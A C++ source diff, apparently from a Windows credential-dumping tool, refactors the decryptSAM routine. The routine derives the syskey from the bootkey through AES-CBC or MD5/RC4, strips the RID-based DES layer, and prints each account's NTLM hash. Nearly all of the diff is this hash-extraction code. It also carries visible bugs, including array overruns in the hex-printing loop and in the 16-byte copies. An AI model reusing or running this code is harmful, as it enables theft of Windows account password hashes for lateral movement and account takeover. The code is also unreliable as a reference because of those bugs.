@@ -23,9 +23,6 @@ using CryptoPP::AES;
 using CryptoPP::CBC_Mode;
 using CryptoPP::ECB_Mode;
 
-#include "cryptopp/include/secblock.h"
-using CryptoPP::SecByteBlock;
-
 #include "cryptopp/include/filters.h"
 using CryptoPP::ArraySource;
 using CryptoPP::StreamTransformationFilter;
@@ -259,17 +256,20 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		LONG bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
 
-		SecByteBlock encNTLM(&(samRegEntries[i]->v[offset + 0x18]), 16);
+		BYTE encNTLM[16] = {};
+		CopyMemory(encNTLM, &(samRegEntries[i]->v[offset + 0x18]), 16);
 
 		if (samRegEntries[i]->v[0xAC] == 0x38) {
-			SecByteBlock encSyskey(&(samRegEntries[i]->f[0x88]), 16);
-			SecByteBlock encSyskeyIV(&(samRegEntries[i]->f[0x78]), 16);
-			SecByteBlock encSyskeyKey((BYTE*)&bootKey,16);
+			BYTE encSyskey[16] = {};
+			BYTE encSyskeyIV[16] = {};
+			// encSyskeyKey = bootkey
+			CopyMemory(encSyskey, &(samRegEntries[i]->f[0x88]), 16);
+			CopyMemory(encSyskeyIV, &(samRegEntries[i]->f[0x78]), 16);
 
-			SecByteBlock sysKey(16);
+			BYTE sysKey[16] = {};
 
 			CBC_Mode< AES >::Decryption d;
-			d.SetKeyWithIV(encSyskeyKey, encSyskeyKey.size(), encSyskeyIV);
+			d.SetKeyWithIV((BYTE*)&bootKey, 16, encSyskeyIV);
 
 			ArraySource s(encSyskey, true,
 				new StreamTransformationFilter(d,
@@ -277,13 +277,14 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 				)
 			);
 
-			SecByteBlock encNTLMIV(&(samRegEntries[i]->v[offset + 0x8]), 16);
+			BYTE encNTLMIV[16] = {};
+			CopyMemory(encNTLMIV, &(samRegEntries[i]->v[offset + 0x8]), 16);
 			// encNTLMKey = encNTLMrecovered
-			
-			CBC_Mode< AES >::Decryption d2;
-			d2.SetKeyWithIV(sysKey, sysKey.size(), encNTLMIV);
 
-			SecByteBlock encNTLMrecovered(16);
+			CBC_Mode< AES >::Decryption d2;
+			d2.SetKeyWithIV(sysKey, 16, encNTLMIV);
+
+			BYTE encNTLMrecovered[16] = {};
 			ArraySource s2(encNTLM, true,
 				new StreamTransformationFilter(d2,
 					new ArraySink(encNTLMrecovered, 16)
@@ -292,10 +293,11 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		}
 		else if (samRegEntries[i]->v[0xAC] == 0x14) {
-			SecByteBlock encSyskey(&(samRegEntries[i]->f[0x80]), 16);
-			SecByteBlock encSyskeyKey(16);
+			BYTE encSyskey[16] = {};
+			BYTE encSyskeyKey[16] = {};
+			CopyMemory(encSyskey, &(samRegEntries[i]->f[0x80]), 16);
 
-			MD5 hash;			
+			MD5 hash;
 
 			hash.Update(&samRegEntries[i]->f[0x70], 16);
 			hash.Update((PBYTE)&strMagic1, strlen(strMagic1));
@@ -303,14 +305,15 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			hash.Update((PBYTE)&strMagic2, strlen(strMagic2));
 			hash.Final(encSyskeyKey);
 
-			SecByteBlock sysKey(16);
+			BYTE sysKey[16] = {};
 
 			ARC4::Decryption dec;
 			dec.SetKey(encSyskeyKey, 16);
 
 			dec.ProcessData(sysKey, encSyskey, 16);
 
-			SecByteBlock encNTLMKey(&(samRegEntries[i]->v[offset + 0x4]), 16);
+			BYTE encNTLMKey[16] = {};
+			CopyMemory(encNTLMKey, &(samRegEntries[i]->v[offset + 0x4]), 16);
 
 			BYTE aux[4] = {};
 			for (int i = 3; i >= 0; i--) {
@@ -331,86 +334,94 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			hash2.Update((PBYTE)&strMagic3, strlen(strMagic3));
 			hash2.Final(encNTLMKey);
 
-			SecByteBlock encNTLMRecovered(16);
+			BYTE encNTLMRecovered[16] = {};
 
-			dec.SetKey(encNTLMKey, 16);
-			dec.ProcessData(encNTLMRecovered, encNTLM, 16);
+			ARC4::Decryption dec2;
+			dec2.SetKey(encNTLMKey, 16);
+			dec2.ProcessData(encNTLMRecovered, encNTLM, 16);
 
 		}
 		else {
 			// TODO default: return blank hash 31D6CFE0D16AE931B73C59D7E0C089C0 or print some error
 		}
 
-		BYTE aux[7] = {};
+		/* TODO: REFACTOR THIS */
+		BYTE des_str_1[7] = {};
+		int j = 0;
 		for (int i = 3; i >= 0; i--) {
-			int j = 0;
-			WCHAR aux[2] = {};
+			CHAR aux[3] = {};
 			aux[0] = samRegEntries[i]->rid[i * 2];
 			aux[1] = samRegEntries[i]->rid[i * 2 + 1];
 
-			PWCHAR end;
+			PCHAR stop;
 
-			aux[i] = wcstoul(aux, &end, 16);
+			des_str_1[j] = strtoul(aux, &stop, 16);
 			j++;
 		}
+		j = 4;
 		for (int i = 3; i >= 1; i--) {
 			int j = 4;
-			WCHAR aux[2] = {};
+			CHAR aux[3] = {};
 			aux[0] = samRegEntries[i]->rid[i * 2];
 			aux[1] = samRegEntries[i]->rid[i * 2 + 1];
 
-			PWCHAR end;
+			PCHAR stop;
 
-			aux[j] = wcstoul(aux, &end, 16);
+			des_str_1[j] = strtoul(aux, &stop, 16);
 			j++;
 		}
 
-		BYTE aux2[7] = {};
-		WCHAR aux3[2] = {};
-		aux3[0] = samRegEntries[0]->rid[0 * 2];
-		aux3[1] = samRegEntries[0]->rid[0 * 2 + 1];
+		BYTE des_str_2[7] = {};
+		CHAR aux[3] = {};
+		aux[0] = samRegEntries[0]->rid[0 * 2];
+		aux[1] = samRegEntries[0]->rid[0 * 2 + 1];
 
-		PWCHAR end;
+		PCHAR stop;
 
-		aux[0] = wcstoul(aux3, &end, 16);
+		des_str_2[0] = strtoul(aux, &stop, 16);
+		
+		j = 1;
 		for (int i = 3; i >= 0; i--) {
-			int j = 1;
-			WCHAR aux[2] = {};
+			CHAR aux[3] = {};
 			aux[0] = samRegEntries[i]->rid[i * 2];
 			aux[1] = samRegEntries[i]->rid[i * 2 + 1];
 
-			PWCHAR end;
+			PCHAR stop;
 
-			aux[j] = wcstoul(aux, &end, 16);
+			des_str_2[j] = strtoul(aux, &stop, 16);
 			j++;
 		}
+
+		j = 5;
 		for (int i = 3; i >= 2; i--) {
-			int j = 5;
-			WCHAR aux[2] = {};
+			CHAR aux[3] = {};
 			aux[0] = samRegEntries[i]->rid[i * 2];
 			aux[1] = samRegEntries[i]->rid[i * 2 + 1];
 
-			PWCHAR end;
+			PCHAR stop;
 
-			aux[j] = wcstoul(aux, &end, 16);
+			des_str_2[j] = strtoul(aux, &stop, 16);
 			j++;
 		}
+		/**/
 
 		BYTE desKey1[8] = {};
 		BYTE desKey2[8] = {};
 		// desKey1IV = desKey1
 		// desKey2IV = desKey2
-		strToKey(aux, desKey1);
-		strToKey(aux2, desKey2);
+		strToKey(des_str_1, desKey1);
+		strToKey(des_str_2, desKey2);
 
 		ECB_Mode< DES >::Decryption desD;
 		desD.SetKey(desKey1, 8);
 
-		SecByteBlock encNTLM1(encNTLM, 8);
-		SecByteBlock encNTLM2(encNTLM + 0x8, 8);
+		BYTE encNTLM1[16] = {};
+		BYTE encNTLM2[16] = {};
+		CopyMemory(encNTLM1, encNTLM, 16);
+		CopyMemory(encNTLM2, encNTLM + 0x8, 16);
 
-		SecByteBlock NTLM1(8);
-		SecByteBlock NTLM2(8);
+		BYTE NTLM1[8] = {};
+		BYTE NTLM2[8] = {};
 
 		ArraySource s(encNTLM1, true,
 			new StreamTransformationFilter(desD,
@@ -418,27 +429,30 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			)
 		);
 
-		desD.SetKey(desKey2, 8);
+		ECB_Mode< DES >::Decryption desD2;
+		desD2.SetKey(desKey2, 8);
 
 		ArraySource s2(encNTLM2, true,
-			new StreamTransformationFilter(desD,
+			new StreamTransformationFilter(desD2,
 				new ArraySink(NTLM2, 8)
 			)
 		);
 
 		BYTE NTLM[16] = {};
+		CHAR NTLMstr[33] = {};
 		CopyMemory(NTLM, NTLM1, 8);
-		CopyMemory(NTLM+8, NTLM2, 8);
+		CopyMemory(NTLM + 8, NTLM2, 8);
 
-		printf("NTLM: %02x", &NTLM);
+		for (int i = 0; i < 33; i++) {
+			sprintf_s(NTLMstr + i * 2, 33, "%02x", NTLM[i]);
+		}
+		printf("NTLM: %s\n", NTLMstr);
 
 		HeapFree(GetProcessHeap(), 0, username);
 	}
 }
 
 void strToKey(PBYTE s, PBYTE keyRet) {
-	WCHAR result[STR_TO_KEY_LEN] = {};
-
 	BYTE oddParity[] = { 0x1, 0x1, 0x2, 0x2, 0x4, 0x4, 0x7, 0x7, 0x8, 0x8, 0xb, 0xb, 0xd, 0xd, 0xe, 0xe, 0x10, 0x10, 0x13, 0x13, 0x15, 0x15, 0x16, 0x16, 0x19, 0x19, 0x1a, 0x1a, 0x1c, 0x1c, 0x1f, 0x1f, 0x20, 0x20, 0x23, 0x23, 0x25, 0x25, 0x26, 0x26, 0x29, 0x29, 0x2a, 0x2a, 0x2c, 0x2c, 0x2f, 0x2f, 0x31, 0x31, 0x32, 0x32, 0x34, 0x34, 0x37, 0x37, 0x38, 0x38, 0x3b, 0x3b, 0x3d, 0x3d, 0x3e, 0x3e, 0x40, 0x40, 0x43, 0x43, 0x45, 0x45, 0x46, 0x46, 0x49, 0x49, 0x4a, 0x4a, 0x4c, 0x4c, 0x4f, 0x4f, 0x51, 0x51, 0x52, 0x52, 0x54, 0x54, 0x57, 0x57, 0x58, 0x58, 0x5b, 0x5b, 0x5d, 0x5d, 0x5e, 0x5e, 0x61, 0x61, 0x62, 0x62, 0x64, 0x64, 0x67, 0x67, 0x68, 0x68, 0x6b, 0x6b, 0x6d, 0x6d, 0x6e, 0x6e, 0x70, 0x70, 0x73, 0x73, 0x75, 0x75, 0x76, 0x76, 0x79, 0x79, 0x7a, 0x7a, 0x7c, 0x7c, 0x7f, 0x7f, 0x80, 0x80, 0x83, 0x83, 0x85, 0x85, 0x86, 0x86, 0x89, 0x89, 0x8a, 0x8a, 0x8c, 0x8c, 0x8f, 0x8f, 0x91, 0x91, 0x92, 0x92, 0x94, 0x94, 0x97, 0x97, 0x98, 0x98, 0x9b, 0x9b, 0x9d, 0x9d, 0x9e, 0x9e, 0xa1, 0xa1, 0xa2, 0xa2, 0xa4, 0xa4, 0xa7, 0xa7, 0xa8, 0xa8, 0xab, 0xab, 0xad, 0xad, 0xae, 0xae, 0xb0, 0xb0, 0xb3, 0xb3, 0xb5, 0xb5, 0xb6, 0xb6, 0xb9, 0xb9, 0xba, 0xba, 0xbc, 0xbc, 0xbf, 0xbf, 0xc1, 0xc1, 0xc2, 0xc2, 0xc4, 0xc4, 0xc7, 0xc7, 0xc8, 0xc8, 0xcb, 0xcb, 0xcd, 0xcd, 0xce, 0xce, 0xd0, 0xd0, 0xd3, 0xd3, 0xd5, 0xd5, 0xd6, 0xd6, 0xd9, 0xd9, 0xda, 0xda, 0xdc, 0xdc, 0xdf, 0xdf, 0xe0, 0xe0, 0xe3, 0xe3, 0xe5, 0xe5, 0xe6, 0xe6, 0xe9, 0xe9, 0xea, 0xea, 0xec, 0xec, 0xef, 0xef, 0xf1, 0xf1, 0xf2, 0xf2, 0xf4, 0xf4, 0xf7, 0xf7, 0xf8, 0xf8, 0xfb, 0xfb, 0xfd, 0xfd, 0xfe, 0xfe };
 
 	BYTE key[8] = {};
